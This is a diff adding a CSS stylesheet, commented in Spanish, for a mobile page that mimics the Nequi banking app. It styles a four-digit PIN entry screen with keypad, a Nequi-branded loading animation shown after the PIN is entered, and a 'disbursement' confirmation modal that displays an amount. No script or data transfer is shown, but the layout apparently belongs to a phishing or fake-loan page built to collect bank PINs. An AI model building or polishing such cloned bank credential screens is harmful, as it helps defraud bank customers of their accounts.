@@ -1,0 +1,409 @@
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  -webkit-tap-highlight-color: transparent;
+}
+
+html, body {
+  width: 100%;
+  height: 100%;
+  background-color: #200020;
+  color: #FFFFFF;
+  font-family: 'Plus Jakarta Sans', 'Montserrat', -apple-system, sans-serif;
+  overflow-x: hidden;
+}
+
+/* Contenedor tipo pantalla móvil de app nativa */
+.screen-container {
+  width: 100%;
+  max-width: 390px;
+  min-height: 100dvh;
+  margin: 0 auto;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  padding: 48px 24px 34px 24px;
+  box-sizing: border-box;
+  position: relative;
+}
+
+/* Título: "Escribe tu clave" a la izquierda */
+.title-heading {
+  font-size: 26px;
+  font-weight: 600;
+  color: #ffffff;
+  letter-spacing: -0.3px;
+  margin-bottom: 46px;
+  text-align: left;
+}
+
+/* 4 Cajas cuadradas de PIN */
+.boxes-group {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 18px;
+  margin-bottom: 30px;
+}
+
+.box-item {
+  width: 52px;
+  height: 52px;
+  background-color: #ebe7f5;
+  border-radius: 6px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: transform 0.12s ease, background-color 0.15s ease;
+}
+
+/* Indicador interno cuando se ingresa el dígito: asterisco rosado oficial Nequi */
+.box-item .inner-dot {
+  width: 100%;
+  height: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #da0081;
+  font-size: 38px;
+  font-weight: 800;
+  line-height: 1;
+  font-family: 'Montserrat', 'Plus Jakarta Sans', sans-serif;
+  padding-top: 10px;
+  opacity: 0;
+  transform: scale(0.3);
+  transition: all 0.15s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+  user-select: none;
+}
+
+.box-item .inner-dot::before {
+  content: "*";
+}
+
+.box-item.filled .inner-dot {
+  opacity: 1;
+  transform: scale(1);
+}
+
+/* Subtítulo centrado en dos líneas */
+.caption-text {
+  text-align: center;
+  color: #FFFFFF;
+  font-size: 14.5px;
+  font-weight: 400;
+  line-height: 1.45;
+  margin: 0 auto;
+  max-width: 300px;
+}
+
+/* Teclado numérico inferior */
+.keypad-grid-layout {
+  width: 100%;
+  max-width: 310px;
+  margin: 0 auto 34px auto;
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  row-gap: 26px;
+  column-gap: 36px;
+  user-select: none;
+}
+
+.key-number-btn {
+  width: 100%;
+  height: 62px;
+  background: transparent;
+  border: none;
+  color: #FFFFFF;
+  font-family: 'Plus Jakarta Sans', sans-serif;
+  font-size: 40px;
+  font-weight: 300;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  outline: none;
+  transition: transform 0.1s ease, opacity 0.1s ease;
+  line-height: 1;
+}
+
+.key-number-btn:active {
+  transform: scale(0.88);
+  opacity: 0.6;
+}
+
+.key-number-btn.blank-slot {
+  pointer-events: none;
+  cursor: default;
+}
+
+/* Botón Borrar (icono estilo tecla backspace blanco con cruz oscura) */
+.key-number-btn.delete-slot {
+  padding: 0;
+}
+
+.delete-badge {
+  width: 34px;
+  height: 25px;
+  background-color: #FFFFFF;
+  clip-path: polygon(26% 0%, 100% 0%, 100% 100%, 26% 100%, 0% 50%);
+  border-radius: 2px 4px 4px 2px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding-left: 5px;
+  box-sizing: border-box;
+}
+
+.delete-cross {
+  font-size: 14px;
+  font-weight: 800;
+  color: #200020;
+  line-height: 1;
+  font-family: sans-serif;
+}
+
+/* Modal de Confirmación y Desembolso al terminar */
+.modal-backdrop-flow {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(18, 0, 19, 0.94);
+  backdrop-filter: blur(8px);
+  z-index: 1000;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 24px;
+  opacity: 0;
+  visibility: hidden;
+  transition: opacity 0.3s ease, visibility 0.3s ease;
+}
+
+.modal-backdrop-flow.active {
+  opacity: 1;
+  visibility: visible;
+}
+
+.modal-dialog-card {
+  background-color: #ffffff;
+  color: #1b001c;
+  width: 100%;
+  max-width: 360px;
+  border-radius: 24px;
+  padding: 32px 24px;
+  text-align: center;
+  box-shadow: 0 16px 40px rgba(0, 0, 0, 0.5);
+  animation: popScale 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+}
+
+@keyframes popScale {
+  from { transform: scale(0.85); opacity: 0; }
+  to { transform: scale(1); opacity: 1; }
+}
+
+.modal-circle-check {
+  width: 66px;
+  height: 66px;
+  border-radius: 50%;
+  background-color: #eafbf0;
+  color: #10b981;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 18px;
+}
+
+.modal-title-success {
+  font-size: 21px;
+  font-weight: 800;
+  color: #1b001c;
+  margin-bottom: 10px;
+}
+
+.modal-desc-success {
+  font-size: 14px;
+  color: #555555;
+  line-height: 1.5;
+  margin-bottom: 22px;
+}
+
+.amount-highlight-box {
+  background-color: #f7ebf5;
+  border: 1px solid #ebd0e6;
+  border-radius: 12px;
+  padding: 12px 16px;
+  margin-bottom: 24px;
+}
+
+.amount-highlight-label {
+  font-size: 12px;
+  color: #8c5588;
+  text-transform: uppercase;
+  font-weight: 700;
+  letter-spacing: 0.5px;
+}
+
+.amount-highlight-val {
+  font-size: 24px;
+  font-weight: 800;
+  color: #da0081;
+  margin-top: 4px;
+}
+
+.btn-return-home {
+  display: block;
+  width: 100%;
+  background-color: #da0081;
+  color: #ffffff;
+  text-decoration: none;
+  padding: 15px;
+  border-radius: 9999px;
+  font-weight: 700;
+  font-size: 15.5px;
+  box-sizing: border-box;
+  transition: background-color 0.2s ease;
+}
+
+.btn-return-home:hover {
+  background-color: #c20073;
+}
+
+/* ============================================================
+   PANTALLA DE CARGA (CUBOS NEQUI TRAS INGRESAR LA CLAVE)
+   ============================================================ */
+.loader-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100vh;
+  background-color: #ffffff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 99999999;
+}
+
+.nequi-loader {
+  width: 62px;
+  height: 62px;
+  position: relative;
+  display: block;
+}
+
+.cubes {
+  width: 100%;
+  height: 100%;
+  position: relative;
+}
+
+.cube {
+  background-color: #da0081;
+  width: 24px;
+  height: 24px;
+  position: absolute;
+  top: 0;
+  left: 0;
+  border-radius: 5px;
+  -webkit-animation: sk-wanderingCube 1.8s ease-in-out infinite;
+  animation: sk-wanderingCube 1.8s ease-in-out infinite;
+}
+
+.cube:nth-child(2) {
+  -webkit-animation-delay: -0.9s;
+  animation-delay: -0.9s;
+}
+
+@keyframes sk-wanderingCube {
+  0% { transform: rotate(0deg); }
+  25% { transform: translateX(34px) rotate(-90deg) scale(0.5); }
+  50% { transform: translateX(34px) translateY(34px) rotate(-179deg); }
+  50.1% { transform: translateX(34px) translateY(34px) rotate(-180deg); }
+  75% { transform: translateX(0px) translateY(34px) rotate(-270deg) scale(0.5); }
+  100% { transform: rotate(-360deg); }
+}
+
+/* ========================================================
+   ADAPTACIONES MÓVILES (ESCRIBE TU CLAVE)
+   ======================================================== */
+@media (max-width: 400px) {
+  .screen-container {
+    padding: 36px 18px 24px 18px;
+    max-width: 360px;
+  }
+
+  .title-heading {
+    font-size: 24px;
+    margin-bottom: 34px;
+  }
+
+  .boxes-group {
+    gap: 14px;
+    margin-bottom: 24px;
+  }
+
+  .box-item {
+    width: 48px;
+    height: 48px;
+  }
+
+  .caption-text {
+    font-size: 13.5px;
+  }
+
+  .keypad-grid-layout {
+    max-width: 290px;
+    row-gap: 20px;
+    column-gap: 28px;
+    margin-bottom: 24px;
+  }
+
+  .key-number-btn {
+    height: 56px;
+    font-size: 36px;
+  }
+}
+
+/* Teléfonos de altura compacta (iPhone SE, Android con navbar inferior) */
+@media (max-height: 700px) {
+  .screen-container {
+    padding: 24px 18px 16px 18px;
+  }
+
+  .title-heading {
+    font-size: 22px;
+    margin-bottom: 20px;
+  }
+
+  .boxes-group {
+    gap: 12px;
+    margin-bottom: 16px;
+  }
+
+  .box-item {
+    width: 44px;
+    height: 44px;
+  }
+
+  .caption-text {
+    font-size: 13px;
+    line-height: 1.35;
+  }
+
+  .keypad-grid-layout {
+    row-gap: 12px;
+    column-gap: 24px;
+    margin-bottom: 12px;
+  }
+
+  .key-number-btn {
+    height: 48px;
+    font-size: 32px;
+  }
+}
+
